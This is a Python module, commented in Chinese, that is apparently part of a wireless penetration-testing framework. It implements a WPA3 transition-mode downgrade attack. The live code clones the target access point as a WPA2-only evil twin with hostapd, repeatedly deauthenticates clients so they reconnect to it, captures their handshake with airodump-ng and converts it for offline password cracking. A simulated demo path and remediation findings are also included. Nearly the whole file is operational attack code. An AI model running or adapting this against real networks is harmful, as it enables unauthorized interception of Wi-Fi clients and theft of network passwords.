"""WPA3 过渡模式降级攻击（Dragonblood 降级路径的工程化实现）."""

from __future__ import annotations

import asyncio
import random
import time
from pathlib import Path

from .base import AttackContext, AttackModule, AttackResult, Option
from .evil_twin import EvilTwin
from ..core.utils import make_run_dir
from ..crack.offline import make_handshake_line
from ..crack.tools import convert_to_22000, count_handshakes
from ..models import normalize_mac
from ..recon.demo import demo_psk


class WPA3Downgrade(AttackModule):
    id = "wpa3_downgrade"
    name = "WPA3 过渡模式降级"
    category = "downgrade"
    description = (
        "针对 WPA2/WPA3 混合模式（Transition Mode）：伪造同名 WPA2-only 恶意 AP，"
        "Deauth 迫使客户端回落到 WPA2 并对其发起四次握手，从而获得可离线爆破的握手。"
        "纯 WPA3（SAE-only）不受此攻击影响。"
    )
    requires = ("hostapd", "aireplay-ng", "airodump-ng", "aircrack-ng")
    risk = "critical"
    needs_monitor = True
    options = [
        Option("timeout", "等待握手（秒）", "int", 180, "超时后停止并返回结果"),
        Option("password", "伪造 AP 口令", "text", "Wraith2024!", "客户端会用真实 PSK 计算 MIC，无需知道真实口令"),
        Option("spoof_bssid", "克隆 BSSID", "bool", True, "克隆目标 BSSID 提高自动关联概率"),
        Option("deauth_interval", "Deauth 间隔（秒）", "int", 12, "周期性把客户端踢向伪造 AP"),
    ]

    def validate(self, params: dict) -> list[str]:
        issues = super().validate(params)
        security = (params.get("security") or "").upper().replace(" ", "")
        if "WPA3" not in security:
            issues.append("目标不是 WPA3/过渡模式，请使用普通握手捕获")
        elif "WPA2" not in security:
            issues.append("目标为纯 WPA3（SAE-only），不支持降级攻击")
        return issues

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("ssid", "")
        channel = int(params.get("channel") or 6)
        timeout = max(30, int(params.get("timeout") or 180))
        ctx.authorize("wpa3_downgrade", bssid, ssid)
        ctx.emit("attack", f"WPA3 过渡模式降级：{ssid} · ch{channel} · {timeout}s", bssid=bssid)

        if ctx.demo:
            return await self._demo(ctx, params, bssid, ssid, channel, started)

        return await self._live(ctx, params, bssid, ssid, channel, timeout, started)

    # ------------------------------------------------------------------ demo
    async def _demo(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        started: float,
    ) -> AttackResult:
        psk = demo_psk(ssid)
        if not psk:
            return AttackResult(
                ok=False, summary="演示目标无 PSK，无法演示降级流程", duration=time.time() - started
            )
        steps = [
            "检测到 WPA2/WPA3 过渡模式（RSN IE 同时含 PSK 与 SAE AKM）",
            "搭建同名 WPA2-only 邪恶双胞胎（模拟）",
            "Deauth 正牌 AP，迫使客户端回落 WPA2",
            "客户端向伪造 AP 发起四次握手",
            "捕获 M2，降级成功",
        ]
        for step in steps:
            await asyncio.sleep(0.6)
            ctx.emit("info", step, bssid=bssid)
        rng = random.Random(ssid + bssid)
        anonce = bytes(rng.getrandbits(8) for _ in range(32))
        snonce = bytes(rng.getrandbits(8) for _ in range(32))
        sta = "3c:07:54:%02x:%02x:%02x" % tuple(rng.randint(0, 255) for _ in range(3))
        line = make_handshake_line(psk, ssid, bssid, sta, anonce, snonce)
        path = ctx.capture_path("downgrade", bssid, "22000")
        path.write_text(line + "\n", encoding="utf-8")
        capture_id = ctx.register_capture(
            "downgrade",
            path,
            bssid=bssid,
            ssid=ssid,
            meta={"demo": True, "attack": "wpa3-transition-downgrade", "client": sta},
        )
        ctx.finding(
            "WPA3 过渡模式可被降级",
            "critical",
            bssid=bssid,
            ssid=ssid,
            detail="客户端回落 WPA2 并产生可离线校验的握手，建议关闭过渡模式或启用 PMF 强制。",
            category="downgrade",
        )
        return AttackResult(
            ok=True,
            summary="降级成功：已获得 WPA2 握手（模拟，可离线校验）",
            detail={"demo": True, "client": sta, "path": str(path)},
            capture_id=capture_id,
            duration=time.time() - started,
        )

    # ------------------------------------------------------------------ live
    async def _live(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int,
        started: float,
    ) -> AttackResult:
        helper = EvilTwin()
        base = await ctx.iface_mgr.resolve(ctx.config.iface)
        if not base:
            raise RuntimeError("未找到可用无线网卡")
        if base.is_monitor:
            # 上一次抓包可能把网卡留在监听模式，直接建 AP 会失败
            ctx.emit("info", f"{base.name} 仍在监听模式，先切回 managed 再创建伪 AP")
            await ctx.iface_mgr.set_type(base.name, "managed")

        second = await helper._second_radio(ctx, base)
        if not second:
            raise RuntimeError(
                "降级攻击需要第二块支持监听模式的网卡：同一块射频无法同时承载伪 AP、"
                "抓包与 Deauth 助攻"
            )
        monitor = await ctx.iface_mgr.enable_monitor(second)
        ctx.monitor_iface = monitor
        await helper._quiesce_base(ctx, base)
        ap_iface = await helper._prepare_ap_iface(ctx, base.name)

        run_dir = make_run_dir(ctx.config.run_path, "wpa3-downgrade")
        conf = run_dir / "hostapd.conf"
        conf.write_text(
            helper._hostapd_config(
                ap_iface,
                ssid,
                channel,
                "wpa2",
                str(params.get("password") or "Wraith2024!"),
                bssid if params.get("spoof_bssid", True) else "",
            ),
            encoding="utf-8",
        )
        prefix = str(run_dir / "capture")
        hostapd_proc = await ctx.runner.background(
            ["hostapd", str(conf)], delay=2.0, on_line=lambda line: ctx.log(f"[hostapd] {line}")
        )
        await ctx.iface_mgr.set_channel(monitor, channel)
        dump_proc = await ctx.runner.background(
            ["airodump-ng", "--bssid", bssid, "-c", str(channel), "--write", prefix,
             "--output-format", "pcap", monitor],
            delay=2.0,
            on_line=lambda line: ctx.log(f"[airodump] {line}"),
        )
        deauth_task = asyncio.create_task(
            helper._deauth_loop(ctx, monitor, bssid, channel, set())
        )
        cap_path = Path(prefix + "-01.cap")
        ctx.emit("success", f"降级 AP 已启动（{ssid} / WPA2），等待客户端回落…")
        found = False
        try:
            deadline = time.time() + timeout
            while time.time() < deadline:
                await asyncio.sleep(3)
                if cap_path.exists() and cap_path.stat().st_size:
                    if await count_handshakes(ctx.runner, cap_path) >= 1:
                        found = True
                        break
        finally:
            deauth_task.cancel()
            try:
                await deauth_task
            except (asyncio.CancelledError, Exception):  # noqa: BLE001
                pass
            await ctx.runner.terminate(dump_proc)
            await ctx.runner.terminate(hostapd_proc)
            await helper._remove_ap_iface(ctx, ap_iface, base.name)
            await ctx.iface_mgr.disable_monitor(monitor)

        if not found:
            return AttackResult(
                ok=False,
                summary=f"未在 {timeout}s 内捕获到降级握手（客户端可能已强制 PMF 或不再回落）",
                detail={"config": str(run_dir), "iface": ap_iface},
                duration=time.time() - started,
            )
        hash_path = ctx.capture_path("downgrade", bssid, "22000")
        ok, lines, _ = await convert_to_22000(ctx.runner, cap_path, hash_path)
        capture_id = ctx.register_capture(
            "downgrade", hash_path if ok else cap_path, bssid=bssid, ssid=ssid,
            meta={"downgrade": True, "lines": lines},
        )
        ctx.finding(
            "WPA3 过渡模式降级成功",
            "critical",
            bssid=bssid,
            ssid=ssid,
            detail="客户端回落至 WPA2 并泄露可离线爆破的握手，建议禁用过渡模式。",
            category="downgrade",
        )
        return AttackResult(
            ok=True,
            summary="降级成功，已捕获可离线校验的握手",
            detail={"config": str(run_dir), "path": str(hash_path) if ok else str(cap_path)},
            capture_id=capture_id,
            duration=time.time() - started,
        )
